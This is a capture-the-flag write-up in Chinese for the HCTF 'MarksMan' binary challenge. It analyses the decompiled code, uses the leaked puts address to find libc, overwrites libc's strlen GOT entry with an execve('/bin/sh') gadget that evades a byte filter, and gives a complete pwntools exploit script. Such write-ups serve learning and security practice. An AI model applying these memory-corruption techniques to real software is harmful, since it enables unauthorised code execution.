# HCTF MarksMan

### 0x1 分析

安全性：

```shell
[*] './chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

全都开着。

看一下程序逻辑

`main()`:

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+8h] [rbp-28h]
  signed int j; // [rsp+Ch] [rbp-24h]
  __int64 v6; // [rsp+10h] [rbp-20h]
  char v7[3]; // [rsp+25h] [rbp-Bh]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init_proc();
  welcome();
  puts("Free shooting games! Three bullets available!");
  printf("I placed the target near: %p\n", &puts);
  puts("shoot!shoot!");
  v6 = get_num();
  for ( i = 0; i <= 2; ++i )
  {
    puts("biang!");
    read(0, &v7[i], 1uLL);
    getchar();
  }
  if ( (unsigned int)check(v7) )
  {
    for ( j = 0; j <= 2; ++j )
      *(_BYTE *)(j + v6) = v7[j];
  }
  if ( !dlopen(0LL, 1) )
    exit(1);
  puts("bye~");
  return 0LL;
}
```

这里直接给我们一个`puts`地址，那么libc的地址也就有了。接下来我们可以输入`v6`一个地址，然后在`v7`输入三个字符来修改`v6`上的三个字符。

但是`./chall`的GOT表不能修改了。

但是`libc.so.6`的并没有把GOT写死，我们就可以修改`libc.so.6`的GOT表，学到了。

```shell
[*] './MarksMan/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

然后我们观察`puts()`，看到`puts()`函数内部调用了`j_strlen()`，这个是`libc.so.6`里的一个存在GOT里的函数。

```assembly
.text:00000000000809C0 puts            proc near               ; DATA XREF: LOAD:00000000000050D0↑o
.text:00000000000809C0                                         ; LOAD:0000000000006678↑o
.text:00000000000809C0 ; __unwind { // sub_21EB0
.text:00000000000809C0                 push    r13
.text:00000000000809C2                 push    r12
.text:00000000000809C4                 mov     r12, rdi
.text:00000000000809C7                 push    rbp
.text:00000000000809C8                 push    rbx
.text:00000000000809C9                 sub     rsp, 8
.text:00000000000809CD                 call    j_strlen
																			 ↓
.plt:0000000000021100 j_strlen        proc near               ; CODE XREF: iconv_open+26↓p
.plt:0000000000021100                                         ; iconv_open+11D↓p ...
.plt:0000000000021100                 jmp     cs:off_3EB0A8
																			 ↓
.got.plt:00000000003EB0A8 off_3EB0A8      dq offset strlen        ; DATA XREF: j_strlen↑r
```

那么可以用`strlen()`的GOT来写入gadget，但是又有一个问题，就是one_gadget得到的地址都被过滤了，不能用：

```c
signed __int64 __fastcall check(_BYTE *a1)
{
  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) && (*a1 != 0x22 || a1[1] != 0xF3u) && *a1 != 0x8Cu && a1[1] != 0xA3u )
    return 1LL;                                 // 0xf2c5 && 0xf322 && a38c
  puts("You always want a Gold Finger!");
  return 0LL;
}
```

我们在`libc.so.6`里找到了一个可以替代的gadget，~~无脑试了好几个~~

```assembly
.text:00000000000E585F loc_E585F:                              ; CODE XREF: execvpe+413↓j
.text:00000000000E585F                 mov     rdx, [rbp+var_70]
.text:00000000000E5863                 lea     rdi, aBinSh     ; "/bin/sh"
.text:00000000000E586A                 mov     rsi, r10
.text:00000000000E586D                 call    execve
```

然后再次调用`puts()`就可以拿到shell了。

### EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./chall', env={'LD_PRELOAD':'./libc.so.6'})
libc = ELF('./libc.so.6')
elf = ELF('./chall')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

#libc && target
p.recvuntil('I placed the target near: ')
libc.address = eval(p.recv(14)) - libc.symbols['puts']
target = libc.address + 0x3eb0a8    #strlen in libc
gadget = libc.address + 0xE585F
payload = [0, 0, 0]
payload[0] = gadget % 0x100
payload[1] = (gadget // 0x100) % 0x100
payload[2] = (gadget // 0x10000) % 0x100
success('libc : ' + str(hex(libc.address)))
success('gagdet : ' + str(hex(gadget)))
success('payload : ' + str(hex(payload[0])) + ' ' + str(hex(payload[1])) + ' ' + str(hex(payload[2])))
pause()

p.sendlineafter('shoot!shoot!\n', str(target))
for i in range(3):
    p.sendlineafter('biang!\n', chr(payload[i]))
p.interactive()
```

